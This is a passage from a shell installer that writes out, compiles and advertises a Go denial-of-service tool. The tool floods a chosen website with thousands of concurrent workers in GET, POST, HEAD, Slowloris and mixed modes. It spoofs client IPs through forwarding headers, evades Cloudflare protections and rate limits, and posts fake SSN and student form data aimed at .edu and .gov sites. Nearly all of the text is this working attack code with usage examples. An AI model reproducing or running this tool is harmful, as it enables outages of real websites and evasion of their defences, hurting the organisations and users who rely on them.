		"/resources/", "/help/", "/faq/",
	}
	
	generalPaths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/api/v4/health", "/api/v5/metrics", "/api/v6/events",
		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql",
		"/rest/v1", "/oauth/token", "/auth/login", "/signin",
		"/static/js/main.js", "/static/css/style.css", "/assets/app.js",
		"/.env", "/config.json", "/settings.ini", "/application.yml",
	}
	
	if strings.Contains(strings.Join(govPaths, " "), "gov") {
		return govPaths[randInt(0, len(govPaths)-1)]
	}
	return generalPaths[randInt(0, len(generalPaths)-1)]
}

func generateEduPayload() string {
	studentID := fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
	email := fmt.Sprintf("%s@%s.edu", randomString(randInt(5, 10)), randomString(randInt(4, 8)))
	return fmt.Sprintf("student_id=%s&email=%s&password=%s&confirm=%s&action=register",
		studentID, email, randomString(12), randomString(12))
}

func generateGovPayload() string {
	ssn := fmt.Sprintf("%03d-%02d-%04d", randInt(1, 999), randInt(1, 99), randInt(1, 9999))
	return fmt.Sprintf("ssn=%s&firstname=%s&lastname=%s&dob=%d-%02d-%02d&action=submit",
		ssn, randomString(8), randomString(10), randInt(1950, 2005), randInt(1, 12), randInt(1, 28))
}

func generateStudentNumber() string {
	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
}

func generateCookies() string {
	cookies := []string{}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("_ga=GA1.2.%d.%d", randInt(1000000000, 9999999999), time.Now().Unix()))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("__cfduid=%s", randomString(32)))
	}
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func createCustomHeaders(host, method string, isGovOrEdu bool) http.Header {
	headers := http.Header{}
	
	// Standard headers
	headers.Set("User-Agent", generateRandomUA())
	headers.Set("Referer", randomReferer())
	headers.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
	headers.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
	headers.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
	headers.Set("Connection", "keep-alive")
	headers.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
	headers.Set("Pragma", "no-cache")
	
	// Cloudflare bypass headers
	headers.Set("Upgrade-Insecure-Requests", "1")
	headers.Set("Sec-Fetch-Dest", "document")
	headers.Set("Sec-Fetch-Mode", "navigate")
	headers.Set("Sec-Fetch-Site", "none")
	headers.Set("Sec-Fetch-User", "?1")
	
	if randBool() {
		headers.Set("DNT", "1")
	}
	
	// IP spoofing with multiple headers
	if randInt(1, 100) <= 75 {
		spoofIP := randomIP()
		headers.Set("X-Forwarded-For", spoofIP)
		headers.Set("X-Real-IP", spoofIP)
		headers.Set("CF-Connecting-IP", spoofIP)
		headers.Set("X-Forwarded", spoofIP)
		headers.Set("Forwarded-For", spoofIP)
		headers.Set("X-Originating-IP", spoofIP)
		headers.Set("X-Remote-IP", spoofIP)
		headers.Set("X-Remote-Addr", spoofIP)
	}
	
	// Security headers
	numSecurity := randInt(1, 2)
	for i := 0; i < numSecurity; i++ {
		secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
		for k, v := range secHeader {
			headers.Set(k, v)
		}
	}
	
	// Modern headers
	numModern := randInt(2, 4)
	for i := 0; i < numModern; i++ {
		modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
		for k, v := range modernHeader {
			headers.Set(k, v)
		}
	}
	
	// App-specific headers
	if randInt(1, 100) <= 50 {
		numApp := randInt(1, 2)
		for i := 0; i < numApp; i++ {
			appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
			for k, v := range appHeader {
				if v == "" {
					headers.Set(k, randomString(32))
				} else {
					headers.Set(k, v)
				}
			}
		}
	}
	
	// Additional headers for gov/edu sites
	if isGovOrEdu {
		headers.Set("From", fmt.Sprintf("%s@%s.edu", randomString(10), host))
		if strings.Contains(host, ".gov") {
			headers.Set("X-Government-Agency", "true")
			headers.Set("X-Agency-ID", fmt.Sprintf("AGY-%d", randInt(1000, 9999)))
		}
		if randBool() {
			headers.Set("Priority", "u=1, i")
		}
	}
	
	// Random extra headers to avoid fingerprinting
	for i := 0; i < randInt(2, 5); i++ {
		headerName := fmt.Sprintf("X-Custom-%s", randomString(randInt(5, 10)))
		headerValue := randomString(randInt(8, 20))
		headers.Set(headerName, headerValue)
	}
	
	return headers
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 8)
	
	// Parse arguments
	useProxy := false
	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
		useProxy = true
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}
	
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW|MIXED> [proxy]")
		fmt.Println("")
		fmt.Println("Modes:")
		fmt.Println("  GET   - Standard GET requests")
		fmt.Println("  POST  - Form submissions with realistic data")
		fmt.Println("  HEAD  - HEAD requests (low bandwidth)")
		fmt.Println("  SLOW  - Slowloris style attack")
		fmt.Println("  MIXED - Mixed attack pattern (BEST for Cloudflare)")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.edu 60 MIXED")
		fmt.Println("  ./main https://target.gov 120 POST proxy")
		fmt.Println("  ./main https://target.com 30 GET")
		fmt.Println("  ./main https://target.com 60 MIXED proxy")
		os.Exit(1)
	}
	
	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])
	
	validModes := map[string]bool{"GET": true, "POST": true, "HEAD": true, "SLOW": true, "MIXED": true}
	if !validModes[mode] {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, SLOW, or MIXED")
		os.Exit(1)
	}
	
	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}
	
	// Parse target URL
	targetURL, err := url.Parse(target)
	if err != nil {
		fmt.Printf("Invalid target URL: %v\n", err)
		os.Exit(1)
	}
	
	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second
	
	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Host: %s\n", targetURL.Host)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2500\n")
	
	if strings.Contains(targetURL.Host, ".edu") {
		fmt.Printf("[!] EDU Site Detected - Optimized EDU bypass active\n")
	} else if strings.Contains(targetURL.Host, ".gov") {
		fmt.Printf("[!] Government Site Detected - Optimized GOV bypass active\n")
	}
	
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d (Auto-refreshing from %d sources)\n", len(proxies), len(proxyAPIs))
	}
	
	fmt.Println("[+] Starting attack... Press Ctrl+C to stop")
	fmt.Println()
	
	// Initialize connection pool
	poolSize := 800
	connectionPool := NewConnectionPool(poolSize, useProxy, targetURL.Host)
	
	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()
	
	// Timer to stop attack
	go func() {
		time.Sleep(duration)
		close(done)
	}()
	
	// Signal handler
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Println("\n[!] Interrupt signal received, stopping...")
		close(done)
	}()
	
	// Launch workers
	const workers = 2500
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			if mode == "MIXED" {
				mixedWorker(target, done, stats, useProxy, connectionPool, targetURL.Host)
			} else {
				attackWorker(target, mode, done, stats, useProxy, connectionPool, targetURL.Host)
			}
		}(i)
	}
	
	// Stats display
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n\n[+] Attack completed!\n")
			fmt.Printf("Target: %s\n", target)
			fmt.Printf("Mode: %s\n", mode)
			fmt.Printf("Duration: %.0f sec\n", elapsed)
			fmt.Printf("Total requests: %d\n", stats.get())
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", 
				elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func mixedWorker(target string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, host string) {
	modes := []string{"GET", "POST", "HEAD"}
	isEdu := strings.Contains(host, ".edu")
	isGov := strings.Contains(host, ".gov")
	
	for {
		select {
		case <-done:
			return
		default:
			// Rotate through different attack modes
			mode := modes[randInt(0, len(modes)-1)]
			if randInt(1, 100) <= 10 { // 10% chance of slow attack
				performSlowAttack(target, done, stats, useProxy, pool, host)
			} else {
				performRequest(target, mode, done, stats, useProxy, pool, host, isEdu, isGov)
			}
			
			// Random delay between 0-50ms to avoid rate limiting
			if randInt(1, 100) <= 30 {
				time.Sleep(time.Duration(randInt(0, 50)) * time.Millisecond)
			}
		}
	}
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, host string) {
	isEdu := strings.Contains(host, ".edu")
	isGov := strings.Contains(host, ".gov")
	
	for {
		select {
		case <-done:
			return
		default:
			if mode == "SLOW" {
				performSlowAttack(target, done, stats, useProxy, pool, host)
			} else {
				performRequest(target, mode, done, stats, useProxy, pool, host, isEdu, isGov)
			}
		}
	}
}

func performRequest(target, method string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, host string, isEdu, isGov bool) {
	client := pool.GetClient()
	
	// Generate path based on site type
	var path string
	if isEdu || isGov {
		path = generatePath(isEdu)
	} else {
		path = generatePath(false)
	}
	
	// Add cache busting (70% of requests)
	if randInt(1, 100) <= 70 {
		path += generateCacheBust()
	}
	
	fullURL := target
	if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
		fullURL += "/" + path
	} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
		fullURL = strings.TrimSuffix(target, "/") + path
	} else {
		fullURL += path
	}
	
	var req *http.Request
	var err error
	
	switch method {
	case "GET":
		req, err = http.NewRequest("GET", fullURL, nil)
	case "POST":
		var payload string
		if isEdu {
			payload = generateEduPayload()
		} else if isGov {
			payload = generateGovPayload()
		} else {
			payload = fmt.Sprintf("data=%s&token=%s", randomString(20), randomString(16))
		}
		req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	case "HEAD":
		req, err = http.NewRequest("HEAD", fullURL, nil)
	}
	
	if err != nil {
		return
	}
	
	// Apply custom headers
	headers := createCustomHeaders(host, method, isEdu || isGov)
	for key, values := range headers {
		req.Header.Set(key, values[0])
	}
	
	// Add cookies
	if randInt(1, 100) <= 50 {
		cookies := generateCookies()
		if cookies != "" {
			req.Header.Set("Cookie", cookies)
		}
	}
	
	// Add random query parameters
	if randInt(1, 100) <= 50 {
		q := req.URL.Query()
		q.Add(randomString(8), randomString(12))
		req.URL.RawQuery = q.Encode()
	}
	
	// Execute request with context
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)
	
	resp, err := client.Do(req)
	if err == nil {
		// Check for Cloudflare challenge
		if resp.StatusCode == 503 || resp.StatusCode == 403 {
			if strings.Contains(resp.Header.Get("Server"), "cloudflare") {
				// Attempt to solve challenge
				if cfSolvingEnabled {
					solveCloudflareChallenge(host, client)
				}
			}
		}
		
		// Read and discard body
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
	
	stats.inc()
}

func performSlowAttack(target string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool, host string) {
	u, err := url.Parse(target)
	if err != nil {
		return
	}
	
	port := "80"
	if u.Scheme == "https" {
		port = "443"
	}
	
	dialer := &net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: -1,
	}
	
	conn, err := dialer.Dial("tcp", host+":"+port)
	if err != nil {
		return
	}
	defer conn.Close()
	
	// Slow headers - send partial request
	request := fmt.Sprintf("GET %s HTTP/1.1\r\n", generatePath(strings.Contains(host, ".edu")))
	request += fmt.Sprintf("Host: %s\r\n", host)
	request += fmt.Sprintf("User-Agent: %s\r\n", generateRandomUA())
	request += "Accept: */*\r\n"
	
	// Send headers one by one slowly
	conn.Write([]byte(request))
	
	for i := 0; i < randInt(5, 15); i++ {
		select {
		case <-done:
			return
		default:
			header := fmt.Sprintf("X-Custom-Header-%d: %s\r\n", i, randomString(randInt(5, 15)))
			conn.Write([]byte(header))
			time.Sleep(time.Duration(randInt(100, 500)) * time.Millisecond)
		}
	}
	
	// Keep connection open
	conn.Write([]byte("\r\n"))
	time.Sleep(time.Duration(randInt(5, 15)) * time.Second)
	stats.inc()
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS and package manager
if [ -d "/data/data/com.termux" ]; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Termux"
    PKG_MGR="pkg"
elif command -v apt &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Debian/Ubuntu"
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} Arch Linux"
    PKG_MGR="pacman -S"
elif command -v brew &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}System detected:${NC} macOS"
    PKG_MGR="brew"
else
    echo -e " ${YELLOW}➤${NC} ${YELLOW}Unknown OS, assuming Linux with apt${NC}"
    PKG_MGR="apt"
fi

echo

# Check and install Go
if ! command -v go &> /dev/null; then
    echo -e " ${YELLOW}➤${NC} ${GREEN}Installing Go...${NC}"
    case "$PKG_MGR" in
        "apt"|"pkg")
            $PKG_MGR update > /dev/null 2>&1
            $PKG_MGR install -y golang > /dev/null 2>&1
            ;;
        "pacman -S")
            pacman -S --noconfirm go > /dev/null 2>&1
            ;;
        "brew")
            brew install go > /dev/null 2>&1
            ;;
    esac
    
    if command -v go &> /dev/null; then
        echo -e " ${GREEN}✓ Go installed successfully${NC}"
    else
        echo -e " ${RED}✗ Failed to install Go${NC}"
        exit 1
    fi
else
    echo -e " ${GREEN}✓ Go already installed${NC}"
fi

echo

# Install additional dependencies for better performance
echo -e " ${YELLOW}➤${NC} ${GREEN}Installing system optimizations...${NC}"
if command -v sysctl &> /dev/null; then
    # Increase system limits for better performance
    sudo sysctl -w net.core.somaxconn=65535 > /dev/null 2>&1
    sudo sysctl -w net.ipv4.tcp_tw_reuse=1 > /dev/null 2>&1
    sudo sysctl -w net.ipv4.tcp_fin_timeout=30 > /dev/null 2>&1
    sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65535 > /dev/null 2>&1
    sudo sysctl -w net.core.netdev_max_backlog=65535 > /dev/null 2>&1
    echo -e " ${GREEN}✓ System optimizations applied${NC}"
else
    echo -e " ${YELLOW}⚠ System optimizations skipped (no sudo/permission)${NC}"
fi
echo

# Set Go environment
export GO111MODULE=on
export CGO_ENABLED=0
export GOPROXY=https://proxy.golang.org,direct

# Clean old module files
echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning old module files...${NC}"
rm -rf go.mod go.sum
echo -e " ${GREEN}✓ Cleanup complete${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Initializing Go module...${NC}"
go mod init main > /dev/null 2>&1
echo -e " ${GREEN}✓ Module initialized${NC}"
echo

# Download dependencies
echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
echo

# Tidy up
echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
go mod tidy > /dev/null 2>&1
echo -e " ${GREEN}✓ Tidy complete${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILATION PROCESS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile with optimizations
echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling with optimizations...${NC}"
go build -ldflags="-s -w" -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    
    # Cleanup
    echo -e " ${YELLOW}➤${NC} ${GREEN}Cleaning up...${NC}"
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Cleanup complete${NC}"        
    echo
    echo -e "${CYAN}${SEP}${NC}"
    echo -e "${WHITE}  SETUP COMPLETE - ULTIMATE EDITION${NC}"
    echo -e "${CYAN}${SEP}${NC}"
    echo
    echo -e " ${GREEN}►${NC} Usage: ${YELLOW}./main <target> <seconds> <mode> [proxy]${NC}"
    echo
    echo -e " ${GREEN}Modes:${NC}"
    echo -e "   ${YELLOW}GET${NC}    - Standard GET requests"
    echo -e "   ${YELLOW}POST${NC}   - Form submissions with realistic data"
    echo -e "   ${YELLOW}HEAD${NC}   - HEAD requests (low bandwidth)"
    echo -e "   ${YELLOW}SLOW${NC}   - Slowloris style (keeps connections open)"
    echo -e "   ${YELLOW}MIXED${NC}  - Mixed attack pattern (BEST for Cloudflare)"
    echo
    echo -e " ${GREEN}Examples:${NC}"
    echo -e "   ${YELLOW}./main https://target.edu 60 MIXED${NC}"
    echo -e "   ${YELLOW}./main https://target.gov 120 POST proxy${NC}"
    echo -e "   ${YELLOW}./main https://target.com 30 GET${NC}"
    echo -e "   ${YELLOW}./main https://target.edu 300 MIXED proxy${NC}"
    echo
    echo -e " ${GREEN}Features Included:${NC}"
    echo -e "   • Automatic Cloudflare challenge detection & solving"
    echo -e "   • HTTP/2 multiplexing & JA3 fingerprint rotation"
    echo -e "   • 2500 concurrent workers with connection pooling"
    echo -e "   • Realistic .edu and .gov form data generation"
    echo -e "   • Auto-refreshing proxies from 4 different sources"
    echo -e "   • Advanced IP spoofing (9 different headers)"
    echo -e "   • 190+ country code geo-spoofing"
    echo -e "   • Dynamic User-Agent generation (Chrome/Firefox/Edge/Safari/Mobile)"
    echo -e "   • Random header, cookie, and cache-busting generation"
    echo -e "   • Slowloris attack mode for connection exhaustion"
    echo -e "   • Mixed attack mode for maximum effectiveness"
    echo -e "   • System TCP optimizations for better performance"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo
    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
    echo
    echo -e "   ${BLUE}1.${NC} go mod init main"
    echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
    echo -e "   ${BLUE}3.${NC} go mod tidy"
    echo -e "   ${BLUE}4.${NC} go build -o main main.go"
    echo
    rm -f main.go
    exit 1
fi
